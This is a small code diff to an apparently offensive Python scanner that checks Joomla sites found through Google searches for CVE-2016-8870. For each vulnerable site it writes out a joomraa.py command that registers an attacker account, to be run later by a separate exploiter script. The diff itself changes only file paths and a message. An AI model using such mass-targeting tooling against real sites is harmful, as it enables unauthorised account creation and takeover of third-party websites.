@@ -90,7 +90,7 @@ class Joomla_CVE_2016_8870():
                     print('[+] Joomla: ' + joomla_version + '\n')
                     cmd = "echo python2 joomraa.py -u anarc0der -p anarc0der "\
                           "-e anarc0der@anarc0der.com {0} >> "\
-                          "../exploits/vuln_joomla_2016_8870.txt"\
+                          "exploits/vuln_joomla_2016_8870.txt"\
                           .format(req.url)
                     os.system(cmd)
                 q.task_done()
@@ -122,10 +122,10 @@ class Joomla_CVE_2016_8870():
 
 
 def main():
-    filename = '../google_results.txt'
+    filename = 'results_google_search.txt'
     Joomla_CVE_2016_8870(filename)
     print('[+] \033[31mThe results of this parser can be exploited '
-          'by\033[33m ../exploits/exploiter.py\033[39m\n')
+          'by\033[33m exploits/exploiter.py\033[39m\n')
 
 
 if __name__ == '__main__':
